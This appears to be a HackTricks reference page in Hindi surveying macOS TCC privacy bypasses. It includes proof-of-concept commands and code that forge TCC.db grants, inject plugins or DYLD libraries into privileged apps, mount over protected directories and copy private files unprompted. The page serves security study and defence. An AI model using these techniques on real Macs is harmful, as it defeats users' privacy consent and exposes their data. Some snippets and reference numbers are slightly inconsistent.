# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## कार्यक्षमता के अनुसार

### Write Bypass

यह bypass नहीं है, यह केवल TCC के काम करने का तरीका है: **यह writing से सुरक्षा नहीं करता**। यदि Terminal के पास किसी user के Desktop को read करने का **access** नहीं है, तब भी वह उसमें write कर सकता है:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
**extended attribute `com.apple.macl`** को नई **file** में जोड़ा जाता है ताकि **creators app** को उसे पढ़ने की access मिल सके।<sup>[[2]](#references)</sup>

### TCC ClickJacking

उपयोगकर्ता को बिना पता चले उसे इसे **accept** करवाने के लिए **TCC prompt के ऊपर एक window रखना** संभव है। आप [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking) में एक PoC पा सकते हैं।<sup>[[18]](#references)</sup>

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### मनमाने नाम से TCC Request

Attacker **किसी भी नाम** (जैसे Finder, Google Chrome...) वाले **apps** को **`Info.plist`** में **create** कर सकता है और उनसे किसी TCC protected location की access request करवा सकता है। उपयोगकर्ता सोचेगा कि यह legit application है जो इस access की request कर रही है।\
इसके अलावा, **legit app को Dock से remove करके उसकी जगह fake app रखना** संभव है। इसलिए जब उपयोगकर्ता fake app पर क्लिक करता है (जो उसी icon का उपयोग कर सकता है), तो यह legit app को call कर सकता है, TCC permissions मांग सकता है और malware execute कर सकता है, जिससे उपयोगकर्ता को लगेगा कि legit app ने access की request की है।<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

अधिक जानकारी और PoC यहां है:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Default रूप से **SSH के माध्यम से access में "Full Disk Access"** हुआ करता था। इसे disable करने के लिए इसे सूची में listed लेकिन disabled रखना आवश्यक है (इसे सूची से remove करने पर वे privileges remove नहीं होंगे):<sup>[[2]](#references)</sup>

![TCC Request by arbitrary name - SSH Bypass: Default रूप से SSH के माध्यम से access में "Full Disk Access" हुआ करता था। इसे disable करने के लिए इसे सूची में listed लेकिन disabled रखना आवश्यक है (इसे सूची से remove करने पर वे privileges...](<../../../../../images/image (1077).png>)

यहां कुछ **malwares द्वारा इस protection को bypass करने** के examples दिए गए हैं:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> ध्यान दें कि अब SSH को enable करने में सक्षम होने के लिए **Full Disk Access** आवश्यक है।

### Handle extensions - CVE-2022-26767

Attribute **`com.apple.macl`** files को दिया जाता है ताकि **किसी निश्चित application को उसे पढ़ने की permissions मिल सकें।** यह attribute तब set होता है जब किसी file को किसी app पर **drag\&drop** किया जाता है, या जब कोई user किसी file को **default application** से open करने के लिए **double-clicks** करता है।

इसलिए, कोई user **एक malicious app register** कर सकता है जो सभी extensions को handle करे और किसी भी file को **open** करने के लिए Launch Services को call करे (इससे malicious file को उसे पढ़ने की access मिल जाएगी)।<sup>[[23]](#references)</sup>

### iCloud

Entitlement **`com.apple.private.icloud-account-access`** के माध्यम से **`com.apple.iCloudHelper`** XPC service के साथ communicate करना संभव है, जो **iCloud tokens provide** करेगी।

**iMovie** और **Garageband** के पास यह entitlement और अन्य अनुमतियां थीं।

इस entitlement से **icloud tokens प्राप्त करने** वाले exploit की अधिक **information** के लिए यह talk देखें: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>

### kTCCServiceAppleEvents / Automation

**`kTCCServiceAppleEvents`** permission वाले app से **अन्य Apps को control** किया जा सकता है। इसका अर्थ है कि वह **अन्य Apps को दी गई permissions का abuse** कर सकता है।<sup>[[2]](#references)</sup>

Apple Scripts के बारे में अधिक जानकारी के लिए देखें:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

उदाहरण के लिए, यदि किसी App के पास **`iTerm` पर Automation permission** है, तो इस example में **`Terminal`** के पास iTerm की access है:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

Terminal, जिसके पास FDA नहीं है, iTerm को call कर सकता है, जिसके पास यह access है, और इसका उपयोग actions perform करने के लिए कर सकता है:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Finder के माध्यम से

या यदि किसी App को Finder के माध्यम से access प्राप्त है, तो वह इस जैसी script चला सकता है:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## App के व्यवहार के अनुसार

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

userland **tccd daemon** **`HOME`** **env** variable का उपयोग TCC users database को इस स्थान से access करने के लिए कर रहा था: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[इस Stack Exchange post](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) के अनुसार, और क्योंकि TCC daemon वर्तमान user के domain के भीतर `launchd` के माध्यम से चल रहा है, इसलिए उसे भेजे जाने वाले **सभी environment variables को नियंत्रित करना** संभव है।<sup>[[19]](#references)</sup>\
इस प्रकार, एक **attacker `launchctl` में `$HOME` environment** variable को किसी **नियंत्रित** **directory** की ओर point कर सकता है, **TCC** daemon को **restart** कर सकता है, और फिर **TCC database को सीधे modify** करके बिना end user को कभी prompt किए खुद को **हर उपलब्ध TCC entitlement** दे सकता है।<sup>[[1]](#references)</sup>\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes को TCC-protected locations तक access प्राप्त था, लेकिन नई बनाई गई note को **non-protected location में store** किया जाता था। इसलिए, attacker Notes से किसी protected file को note में copy करने के लिए कह सकता था और फिर non-protected location से परिणामी data तक access कर सकता था:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Library `libsecurity_translocate` वाली binary `/usr/libexec/lsd` के पास `com.apple.private.nullfs_allow` entitlement था, जो उसे **nullfs** mount बनाने की अनुमति देता था। इसके पास **`kTCCServiceSystemPolicyAllFiles`** के साथ `com.apple.private.tcc.allow` entitlement भी था, जिससे वह हर file तक access कर सकती थी।

"Library" में quarantine attribute जोड़ना, **`com.apple.security.translocation`** XPC service को call करना और फिर Library को **`$TMPDIR/AppTranslocation/d/d/Library`** पर map करना संभव था, जहाँ Library के अंदर मौजूद सभी documents को **access** किया जा सकता था।

### CVE-2024-44131 - FileProvider symlink race

जो Apps file operations को **privileged helper** (यहाँ **`fileproviderd`** / `Files.app`) को सौंपती हैं, वे user की ओर से items को copy या move करती हैं, इसलिए copy caller के बजाय helper के privileges के साथ चलती है।

Jamf Threat Labs ने दिखाया कि operation से पहले की जाने वाली symlink validation को **race** किया जा सकता है: symlink को **last** path component पर रखने के बजाय (जिसकी जाँच की जाती है), attacker copy शुरू होने के **बाद** path की किसी **intermediate** directory को बदल देता है। इसके बाद privileged helper attacker-controlled link को follow करता है और **बिना कोई prompt दिखाए** TCC-protected locations को read/write करता है।<sup>[[5]](#references)</sup>

वे directories जो अपने path में random UUID द्वारा **protected** नहीं हैं (उदाहरण के लिए `~/Library/Mobile Documents/com~apple~CloudDocs`), सबसे आसान targets हैं, क्योंकि attacker race के लिए पूरा path पहले से predict कर सकता है।

> [!TIP]
> यह देखने योग्य generic pattern है: **कोई भी privileged process जो किसी path को एक से अधिक बार resolve करता है** (check-then-use, या `rename()`/`copyfile()` द्वारा source और destination को अलग-अलग resolve करना), path के बीच में किसी directory को बदलकर race किया जा सकता है। केवल `O_NOFOLLOW_ANY`, पहले से खोले गए directory FD पर `openat()`, या `realpath()` + re-validation ही वास्तव में इस window को बंद करते हैं।

[**the Jamf Threat Labs writeup**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/) में अधिक जानकारी है।<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` को `SQLITE_ENABLE_SQLLOG` के साथ build किया जा सकता है, जिससे environment variables द्वारा नियंत्रित logging hook जुड़ जाता है ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – **हर खोली जाने वाली database** के लिए, **database file की एक copy** और SQL statements का log `path` में लिखा जाता है (directory पहले से मौजूद होनी चाहिए)।
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – DB को open/attach किए जाने पर हर बार किसी file को reuse करने के बजाय उसकी **नई copy** बनाता है।
- **`SQLITE_SQLLOG_CONDITIONAL`** – केवल तभी connection को log करता है जब main DB के पास `<database>-sqllog` file मौजूद हो।

यदि आप इस variable को ऐसे process में inject कर सकते हैं जिसके पास **FDA** है और जो SQLite databases खोलता है, तो वह खुशी-खुशी उन **protected databases** को आपके control वाली directory में **copy** कर देगा। क्योंकि destination filename attacker-controlled data से derived होता है, destination पर रखा गया **symlink** उसी primitive को target process के privileges के साथ **arbitrary file write** में बदल देता है।

### **SQLITE_AUTO_TRACE**

यदि environment variable **`SQLITE_AUTO_TRACE`** set किया गया हो, तो library **`libsqlite3.dylib`** सभी SQL queries की **logging** शुरू कर देगी। कई applications इस library का उपयोग करती थीं, इसलिए उनकी सभी SQLite queries को log करना संभव था।<sup>[[22]](#references)</sup>

कई Apple applications ने TCC protected information तक access करने के लिए इस library का उपयोग किया।
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### env-var driven file writes की Hunting

पिछली दो entries एक ही generic technique के उदाहरण हैं, और ऐसी और instances को ढूंढना उपयोगी है: **TCC-privileged apps में loaded frameworks अक्सर debug/logging environment variables expose करते हैं, जो process को caller-controlled path पर file create करने के लिए मजबूर कर सकते हैं**।

उन्हें खोजने का workflow:

1. FDA या किसी अन्य उपयोगी TCC permission (`Music`, `TV`, `Terminal`, MDM agents...) वाले target को चुनें और उन frameworks की सूची बनाएं जिनसे यह link करता है (`otool -L`, `vmmap`)।
2. उन frameworks में `getenv` strings के लिए grep करें: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`।
3. `launchctl setenv NAME /path/you/control` के जरिए candidate variables set करें, app launch करें और देखें कि वह filesystem पर क्या करता है। इसके लिए `fs_usage -w -f filesys <pid>` या `sudo fs_usage | grep <path>` इस्तेमाल करें।
4. यदि process आपकी directory में कोई file **create या rename** करता है, तो आपके पास एक write primitive है: destination को किसी symlink पर point करें (या किसी intermediate directory को race करें, जैसा ऊपर CVE-2024-44131 में है) ताकि उसे `~/Library/Application Support/com.apple.TCC/TCC.db` पर redirect किया जा सके।

> [!TIP]
> दो चीजें इसे सीमित करती हैं। पहली, **`DYLD_*` variables hardened-runtime binaries के लिए ignore किए जाते हैं**, जब तक कि app में [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) entitlement मौजूद न हो ("एक Boolean value जो बताती है कि app dynamic linker environment variables से प्रभावित हो सकता है या नहीं, जिनका उपयोग app के process में code inject करने के लिए किया जा सकता है") — [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/) भी देखें। दूसरी, Apple द्वारा report किए जाने के बाद individual framework debug variables को हटा दिया जाता है, इसलिए किसी एक macOS release पर काम करने वाला variable अक्सर अगले release में मौजूद नहीं होता। यदि किसी variable को set करने के बाद app silently launch होने से मना कर दे, तो उस variable को पहले से filtered मानें।<sup>[[7]](#references)[[8]](#references)</sup>

Linker variables के साथ इसी equivalent trick के लिए [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) देखें।

### Apple Remote Desktop

root के रूप में आप इस service को enable कर सकते थे और **ARD agent के पास full disk access होगा**, जिसका फिर user द्वारा एक नया **TCC user database** copy करवाने के लिए abuse किया जा सकता था।

## NFSHomeDirectory द्वारा

TCC user-specific resources तक access control करने के लिए user के HOME folder में database का उपयोग करता है: **$HOME/Library/Application Support/com.apple.TCC/TCC.db**।\
इसलिए, यदि user एक अलग folder की ओर point करने वाले $HOME env variable के साथ TCC को restart करवा सके, तो user **/Library/Application Support/com.apple.TCC/TCC.db** में एक नया TCC database create कर सकता है और TCC को किसी भी app को कोई भी TCC permission grant करने के लिए trick कर सकता है।

> [!TIP]
> ध्यान दें कि Apple **`NFSHomeDirectory`** attribute में user के profile के भीतर stored setting का उपयोग **`$HOME`** की **value** के रूप में करता है। इसलिए, यदि आप ऐसी application को compromise कर लेते हैं जिसके पास इस value को modify करने की permission (**`kTCCServiceSystemPolicySysAdminFiles`**) है, तो आप इस option को TCC bypass के साथ **weaponize** कर सकते हैं।

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**पहला POC** user के **HOME** folder को modify करने के लिए [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) और [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) का उपयोग करता है।

1. Target app के लिए एक _csreq_ blob प्राप्त करें।
2. Required access और _csreq_ blob के साथ एक fake _TCC.db_ file plant करें।
3. [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) के साथ user की Directory Services entry export करें।
4. User की home directory बदलने के लिए Directory Services entry को modify करें।
5. Modified Directory Services entry को [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) के साथ import करें।
6. User के _tccd_ को stop करें और process को reboot करें।

दूसरे POC में **`/usr/libexec/configd`** का उपयोग किया गया, जिसके पास `com.apple.private.tcc.allow` में `kTCCServiceSystemPolicySysAdminFiles` value थी।\
`configd` को **`-t`** option के साथ run करना संभव था, जिससे attacker एक **custom Bundle to load** specify कर सकता था। इसलिए exploit user की home directory बदलने के लिए **`dsexport`** और **`dsimport`** method को **`configd` code injection** से **replace** करता है।

अधिक जानकारी के लिए [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/) देखें।<sup>[[11]](#references)</sup>

## By process injection

किसी process के अंदर code inject करने और उसके TCC privileges का abuse करने के लिए अलग-अलग techniques हैं:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

इसके अलावा, TCC bypass करने के लिए पाया जाने वाला सबसे common process injection **plugins (load library)** के जरिए होता है।\
Plugins आमतौर पर libraries या plist के रूप में extra code होते हैं, जिन्हें **main application द्वारा load** किया जाता है और जो उसके context में execute होते हैं। इसलिए, यदि main application के पास TCC restricted files का access था (granted permissions या entitlements के जरिए), तो **custom code के पास भी वह access होगा**।

### CVE-2020-27937 - Directory Utility

Application `/System/Library/CoreServices/Applications/Directory Utility.app` के पास **`kTCCServiceSystemPolicySysAdminFiles`** entitlement था, यह **`.daplug`** extension वाले plugins load करती थी और इसमें **hardened** runtime नहीं था।

इस CVE को weaponize करने के लिए **`NFSHomeDirectory`** को बदला जाता है (previous entitlement का abuse करके), ताकि user के TCC database पर **take over** किया जा सके और TCC bypass किया जा सके।

अधिक जानकारी के लिए [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/) देखें।<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

Binary **`/usr/sbin/coreaudiod`** के पास `com.apple.security.cs.disable-library-validation` और `com.apple.private.tcc.manager` entitlements थे। पहला **code injection की अनुमति देता था** और दूसरा उसे **TCC manage करने का access** देता था।

यह binary `/Library/Audio/Plug-Ins/HAL` folder से **third party plug-ins** load कर सकती थी। इसलिए इस PoC के साथ **एक plugin load करना और TCC permissions का abuse करना** संभव था:<sup>[[13]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
अधिक जानकारी के लिए [**मूल report**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/) देखें।<sup>[[13]](#references)</sup>

### Device Abstraction Layer (DAL) Plug-Ins

वे System applications जो Core Media I/O के माध्यम से camera stream खोलते हैं (वे apps जिनमें **`kTCCServiceCamera`** होता है), `/Library/CoreMediaIO/Plug-Ins/DAL` में स्थित इन plugins को process में load करते हैं (SIP restricted नहीं हैं)।

वहाँ common **constructor** वाली library को केवल store करने से **code inject** करना काम करेगा।

कई Apple applications इसके प्रति vulnerable थे।

### Firefox

Firefox application में `com.apple.security.cs.disable-library-validation` और `com.apple.security.cs.allow-dyld-environment-variables` entitlements थे:<sup>[[14]](#references)</sup>
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
इस बारे में अधिक जानकारी के लिए कि इसे आसानी से कैसे exploit करें, [**original report देखें**](https://wojciechregula.blog/post/how-to-rob-a-firefox/)।<sup>[[14]](#references)</sup>

### CVE-2020-10006

बाइनरी `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` के पास **`com.apple.private.tcc.allow`** और **`com.apple.security.get-task-allow`** entitlements थे, जिनके कारण process के अंदर code inject करना और TCC privileges का उपयोग करना संभव था।

### CVE-2023-26818 - Telegram

Telegram के पास **`com.apple.security.cs.allow-dyld-environment-variables`** और **`com.apple.security.cs.disable-library-validation`** entitlements थे, इसलिए इसका दुरुपयोग करके **इसके permissions तक access प्राप्त करना** संभव था, जैसे camera से recording करना। आप [**writeup में payload देख सकते हैं**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)।<sup>[[15]](#references)</sup>

ध्यान दें कि library load करने के लिए env variable का उपयोग कैसे किया गया: इस library को inject करने के लिए एक **custom plist** बनाई गई और इसे launch करने के लिए **`launchctl`** का उपयोग किया गया:<sup>[[15]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## open invocations द्वारा

sandboxed होने पर भी **`open`** को invoke करना संभव है।

### Terminal Scripts

Tech लोगों द्वारा उपयोग किए जाने वाले computers में Terminal को **Full Disk Access (FDA)** देना काफी सामान्य है। और इसके साथ **`.terminal`** scripts को invoke करना संभव है।

**`.terminal`** scripts ऐसी plist files होती हैं, जिनमें execute किया जाने वाला command **`CommandString`** key में होता है:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
एक application /tmp जैसी location में एक terminal script लिख सकती है और उसे इस तरह के command से launch कर सकती है:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## By mounting

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**कोई भी user** (यहाँ तक कि unprivileged users भी) एक time machine snapshot create और mount कर सकता है और उस snapshot की **सभी files तक access** प्राप्त कर सकता है।\
आवश्यक **एकमात्र privilege** यह है कि उपयोग किए गए application (जैसे `Terminal`) के पास **Full Disk Access** (FDA) access (`kTCCServiceSystemPolicyAllfiles`) हो, जिसे एक admin द्वारा grant किया जाना आवश्यक है।<sup>[[2]](#references)</sup>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
एक अधिक विस्तृत विवरण [**original report में पाया जा सकता है**](https://theevilbit.github.io/posts/cve_2020_9771/)**।**<sup>[[20]](#references)</sup>

### CVE-2021-1784 & CVE-2021-30808 - Mount over TCC file

भले ही TCC DB file protected हो, फिर भी **directory के ऊपर mount** करके एक नई TCC.db file लगाना संभव था:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
**full exploit** को [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/) में देखें।<sup>[[21]](#references)</sup>

### CVE-2024-40855

जैसा कि [original writeup](https://www.kandji.io/blog/macos-audit-story-part2) में समझाया गया है, इस CVE ने `diskarbitrationd` का दुरुपयोग किया।<sup>[[16]](#references)</sup>

Public `DiskArbitration` framework का `DADiskMountWithArgumentsCommon` function security checks करता था। हालांकि, `diskarbitrationd` को सीधे call करके इसे bypass करना संभव था और इसलिए path में `../` elements और symlinks का उपयोग किया जा सकता था।

इससे attacker को किसी भी location पर arbitrary mounts करने की अनुमति मिल गई, जिसमें TCC database के ऊपर mount करना भी शामिल था, क्योंकि `diskarbitrationd` के पास `com.apple.private.security.storage-exempt.heritable` entitlement था।

### asr

Tool **`/usr/sbin/asr`** पूरे disk को copy करके किसी अन्य स्थान पर mount करने की अनुमति देता था, जिससे TCC protections bypass हो जाती थीं।

### CVE-2022-22655 - Location Services

Location Services अन्य services की तरह **TCC database** में stored नहीं होती हैं। इन्हें `locationd` manage करता है, जो अपनी allow-list **`/var/db/locationd/clients.plist`** में रखता है:<sup>[[4]](#references)</sup>
```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```
प्रत्येक entry को client (bundle ID या executable path) द्वारा keyed किया जाता है और इसमें `Authorized`, `BundleId`, `Executable` और `Registered` जैसे fields होते हैं।<sup>[[4]](#references)</sup>

`clients.plist` file स्वयं Sandbox/TCC द्वारा protected है और इसे root के रूप में भी edit नहीं किया जा सकता — लेकिन **`/var/db/locationd/` directory mounting से protected नहीं थी**। इसलिए root के रूप में चल रहा attacker अपनी `clients.plist` वाली disk image बना सकता था (जिसमें उसके binary को `Authorized` mark किया गया हो), उसे directory पर mount कर सकता था और forged allow-list को प्रभावी बनाने के लिए `locationd` को restart कर सकता था।<sup>[[3]](#references)</sup>

> [!TIP]
> यह ऊपर दिए गए `hdiutil`/`mount` TCC bypasses जैसा ही pattern है: *file* protected है, लेकिन जिस *directory* में वह मौजूद है, वह protected नहीं है; इसलिए file के बजाय पूरी directory को replace किया जाता है।

## Startup apps द्वारा


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## grep द्वारा

कई अवसरों पर files sensitive information जैसे emails, phone numbers, messages... को non-protected locations में store करेंगी (जो Apple के अनुसार vulnerability मानी जाती है)।

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

यह अब काम नहीं करता, लेकिन [**अतीत में काम करता था**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

[**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf) का उपयोग करने का एक अन्य तरीका:<sup>[[17]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## References

- [1] [CVE-2020–9934: macOS Transparency, Consent, and Control (TCC) Framework को bypass करना](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [macOS TCC User Privacy Protections को दुर्घटनावश और design द्वारा bypass करना](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [CVE-2022-22655 - TCC Location Services bypass (original report)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [4] [दुनिया में Carmen Sandiego कहाँ है: macOS पर Location Services का दुरुपयोग](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs - CVE-2024-44131: TCC bypass द्वारा iCloud से data चुराना](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG env variables)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple - Allow DYLD environment variables entitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company - Notarization: hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
